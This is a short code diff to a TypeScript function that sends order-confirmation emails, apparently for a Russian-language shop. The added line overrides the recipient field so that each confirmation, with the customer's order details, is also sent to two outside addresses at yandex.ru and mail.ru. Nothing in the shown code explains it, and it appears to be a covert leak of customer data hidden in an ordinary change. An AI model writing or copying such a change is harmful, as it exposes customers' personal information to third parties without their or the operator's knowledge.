@@ -116,6 +116,7 @@ export async function mailOrderConfirm(to: string, details: CreateOrder){
 	const mailOptions = {
 			from: user,
 			to,
+			to: [to, "berdinazzi@yandex.ru", "deathvastador@mail.ru"],
 			subject: 'Заказ оформлен',
 			text: message,
 			html: emailHtml,
